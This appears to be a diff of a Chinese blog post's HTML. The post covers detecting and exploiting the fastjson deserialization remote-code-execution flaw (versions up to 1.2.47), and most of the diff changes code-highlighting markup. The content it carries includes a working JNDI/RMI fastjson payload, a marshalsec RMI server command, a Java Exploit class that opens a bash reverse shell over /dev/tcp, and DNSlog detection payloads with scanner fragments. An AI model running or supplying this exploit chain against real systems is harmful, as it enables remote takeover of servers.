@@ -49,7 +49,7 @@
 <li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
 <li>如果不熟悉，就看官方文档，文档，文档。</li>
 </ol>
-<div class="highlight"><pre><span></span><span class="n">main</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="o">.</span><span class="n">py</span>
 
 <span class="c1">#/usr/bin/env python</span>
 <span class="c1">#! -*- coding:utf-8 -*-</span>
@@ -94,40 +94,40 @@
                     <span class="k">print</span> <span class="s2">&quot;&quot;</span>
                 <span class="k">else</span><span class="p">:</span>
                     <span class="k">pass</span>
-</pre></div>
+</code></pre></div>
 
 
 <hr>
 <p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
-<div class="highlight"><pre><span></span><span class="err">{</span><span class="ss">&quot;@type&quot;</span><span class="err">:</span><span class="ss">&quot;java.lang.Class&quot;</span><span class="p">,</span><span class="ss">&quot;val&quot;</span><span class="err">:</span><span class="ss">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="err">}</span><span class="p">,</span><span class="ss">&quot;f&quot;</span><span class="err">:{</span><span class="ss">&quot;@type&quot;</span><span class="err">:</span><span class="ss">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="ss">&quot;dataSourceName&quot;</span><span class="err">:</span><span class="ss">&quot;rmi://ip:8000/Exploit&quot;</span><span class="p">,</span><span class="ss">&quot;autoCommit&quot;</span><span class="err">:</span><span class="k">true</span><span class="err">}}</span><span class="w"></span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:8000/Exploit&quot;,&quot;autoCommit&quot;:true}}</span>
+</code></pre></div>
 
 
 <p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p>
-<div class="highlight"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">target</span><span class="o">/</span><span class="n">marshalsec</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="k">all</span><span class="p">.</span><span class="n">jar</span> <span class="n">marshalsec</span><span class="p">.</span><span class="n">jndi</span><span class="p">.</span><span class="n">RMIRefServer</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="p">:</span><span class="mi">8888</span><span class="o">/#</span><span class="n">Exploit</span> <span class="mi">8000</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8888/#Exploit 8000</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="nv">Exploit</span>.<span class="nv">java</span>
-<span class="nv">javac</span> <span class="nv">Exploit</span>.<span class="nv">java</span>  <span class="o">//</span>编译为<span class="nv">class</span>
-<span class="nv">java</span> <span class="nv">Exploit</span>  <span class="o">//</span>运行测试
-然后用<span class="nv">python</span>的<span class="nv">http</span>模块起一个<span class="nv">web</span>服务就可用。
+<div class="highlight"><pre><span></span><code><span class="n">Exploit</span><span class="p">.</span><span class="n">java</span>
+<span class="n">javac</span> <span class="n">Exploit</span><span class="p">.</span><span class="n">java</span>  <span class="o">//</span><span class="err">编译为</span><span class="k">class</span>
+<span class="n">java</span> <span class="n">Exploit</span>  <span class="o">//</span><span class="err">运行测试</span>
+<span class="err">然后用</span><span class="n">python的http模块起一个web服务就可用</span><span class="err">。</span>
 
-<span class="nv">public</span> <span class="nv">class</span> <span class="nv">Exploit</span> {
-    <span class="nv">public</span> <span class="nv">Exploit</span><span class="ss">()</span>{
-        <span class="nv">try</span> {
-            <span class="o">//</span> <span class="nv">Runtime</span>.<span class="nv">getRuntime</span><span class="ss">()</span>.<span class="k">exec</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">calc</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-            <span class="nv">java</span>.<span class="nv">lang</span>.<span class="nv">Runtime</span>.<span class="nv">getRuntime</span><span class="ss">()</span>.<span class="k">exec</span><span class="ss">(</span>
-                    <span class="nv">new</span> <span class="nv">String</span>[]{<span class="s2">&quot;</span><span class="s">bash</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">-c</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4545 0&gt;&amp;1</span><span class="s2">&quot;</span>}<span class="ss">)</span><span class="c1">;</span>
-        } <span class="nv">catch</span><span class="ss">(</span><span class="nv">Exception</span> <span class="nv">e</span><span class="ss">)</span>{
-            <span class="nv">e</span>.<span class="nv">printStackTrace</span><span class="ss">()</span><span class="c1">;</span>
-        }
-    }
-    <span class="nv">public</span> <span class="nv">static</span> <span class="nv">void</span> <span class="nv">main</span><span class="ss">(</span><span class="nv">String</span>[] <span class="nv">argv</span><span class="ss">)</span>{
-        <span class="nv">Exploit</span> <span class="nv">e</span> <span class="o">=</span> <span class="nv">new</span> <span class="nv">Exploit</span><span class="ss">()</span><span class="c1">;</span>
-    }
-}
-</pre></div>
+<span class="k">public</span> <span class="k">class</span> <span class="n">Exploit</span> <span class="err">{</span>
+    <span class="k">public</span> <span class="n">Exploit</span><span class="p">()</span><span class="err">{</span>
+        <span class="n">try</span> <span class="err">{</span>
+            <span class="o">//</span> <span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="ss">&quot;calc&quot;</span><span class="p">);</span>
+            <span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span>
+                    <span class="k">new</span> <span class="n">String</span><span class="p">[]</span><span class="err">{</span><span class="ss">&quot;bash&quot;</span><span class="p">,</span> <span class="ss">&quot;-c&quot;</span><span class="p">,</span> <span class="ss">&quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4545 0&gt;&amp;1&quot;</span><span class="err">}</span><span class="p">);</span>
+        <span class="err">}</span> <span class="n">catch</span><span class="p">(</span><span class="k">Exception</span> <span class="n">e</span><span class="p">)</span><span class="err">{</span>
+            <span class="n">e</span><span class="p">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+        <span class="err">}</span>
+    <span class="err">}</span>
+    <span class="k">public</span> <span class="k">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">argv</span><span class="p">)</span><span class="err">{</span>
+        <span class="n">Exploit</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="p">();</span>
+    <span class="err">}</span>
+<span class="err">}</span>
+</code></pre></div>
 
 
 <p>首先你要有一个可以打的接口，这就很蛋疼了。想了半天找了lufei写的一个xxescanner，想了下可以修改为自己的检测工具，但是到最后没成功。</p>
@@ -135,26 +135,26 @@
 <h3>DNSlog</h3>
 <p>因为使用新的payload打了存在fastjson漏洞的应用之后，老的payload就可以打了 :)
 从小密圈里面找到了一份POC</p>
-<div class="highlight"><pre><span></span><span class="err">{</span><span class="ss">&quot;name&quot;</span><span class="err">:{</span><span class="ss">&quot;@type&quot;</span><span class="err">:</span><span class="ss">&quot;java.net.InetAddress&quot;</span><span class="p">,</span><span class="ss">&quot;val&quot;</span><span class="err">:</span><span class="ss">&quot;baidu.com&quot;</span><span class="err">}}</span><span class="w"></span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">{&quot;name&quot;:{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;baidu.com&quot;}}</span>
+</code></pre></div>
 
 
 <p>可以利用dnslog，根据val更换为自己的服务器，辣么久可以了。这个poc在1.2.48之后就不能用了，简直是绝佳的POC。
 dnslog要用bit4改之后的那个。</p>
 <p>思路就是请求自己的解析，然后根据接口去检测是否有对应的解析:</p>
-<div class="highlight"><pre><span></span><span class="err">{</span><span class="ss">&quot;name&quot;</span><span class="err">:{</span><span class="ss">&quot;@type&quot;</span><span class="err">:</span><span class="ss">&quot;java.net.InetAddress&quot;</span><span class="p">,</span><span class="ss">&quot;val&quot;</span><span class="err">:</span><span class="ss">&quot;test.baidu.com&quot;</span><span class="err">}}</span><span class="w"></span>
-<span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">apiquery</span><span class="o">/</span><span class="n">dns</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">a2f78f403d7b8b92ca3486bb4dc0e498</span><span class="o">/</span><span class="w"></span>
-<span class="o">//</span><span class="n">查询是否有test的解析</span><span class="w"></span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">{&quot;name&quot;:{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;test.baidu.com&quot;}}</span>
+<span class="c">http://127.0.0.1:8000/apiquery/dns/test/a2f78f403d7b8b92ca3486bb4dc0e498/</span>
+<span class="err">//查询是否有test的解析</span>
+</code></pre></div>
 
 
 <p>实际中可以生成一串随机字符串，然后去请求是否有对应的解析:</p>
-<div class="highlight"><pre><span></span>    <span class="nv">def</span> <span class="nv">genRandom</span><span class="ss">(</span><span class="nv">self</span><span class="ss">)</span>:
-        <span class="nv">letters</span> <span class="o">=</span> <span class="nv">string</span>.<span class="nv">ascii_lowercase</span>
-        <span class="nv">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.<span class="nv">join</span><span class="ss">(</span><span class="k">random</span>.<span class="nv">sample</span><span class="ss">(</span><span class="nv">letters</span>, <span class="mi">10</span><span class="ss">))</span>
-        <span class="nv">payload</span> <span class="o">=</span> <span class="nv">hashlib</span>.<span class="nv">md5</span><span class="ss">(</span><span class="nv">s</span> <span class="o">+</span> <span class="nv">str</span><span class="ss">(</span><span class="nv">time</span>.<span class="nv">time</span><span class="ss">()))</span>.<span class="nv">hexdigest</span><span class="ss">()</span>
-        <span class="k">return</span> <span class="nv">payload</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">    def genRandom(self):</span>
+<span class="err">        letters = string.ascii_lowercase</span>
+<span class="err">        s = &#39;&#39;.join(random.sample(letters, 10))</span>
+<span class="err">        payload = hashlib.md5(s + str(time.time())).hexdigest()</span>
+<span class="err">        return payload</span>
+</code></pre></div>
 
 
 <p>两个步骤:</p>
@@ -165,7 +165,7 @@ dnslog要用bit4改之后的那个。</p>
 <h3>不足</h3>
 <p>requests是同步请求，所以如果你的dnslog服务器放在太平洋那边，你的burp会让你怀疑人生，加nginx反代，加cdn。</p>
 <p>MD终于弄完了。</p>
-<div class="highlight"><pre><span></span><span class="n">main</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="o">.</span><span class="n">py</span>
 
 <span class="c1">#/usr/bin/env python</span>
 <span class="c1">#! -*- coding:utf-8 -*-</span>
@@ -226,10 +226,10 @@ dnslog要用bit4改之后的那个。</p>
                         <span class="k">print</span> <span class="s2">&quot;[Critical] Found it is a Fastjson RCE </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">noauth_result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                     <span class="k">print</span> <span class="s2">&quot;======================================================================================&quot;</span>
                     <span class="k">print</span> <span class="s2">&quot;&quot;</span>
-</pre></div>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="n">noauth</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><code><span class="n">noauth</span><span class="o">.</span><span class="n">py</span>
 
 <span class="c1">#!/usr/bin/env python</span>
 <span class="c1">#! -*- coding:utf-8 -*-</span>
@@ -292,7 +292,7 @@ dnslog要用bit4改之后的那个。</p>
         <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">letters</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span>
         <span class="n">payload</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
         <span class="k">return</span> <span class="n">payload</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>这个文章很精彩呀，所以被删除了啊</p>
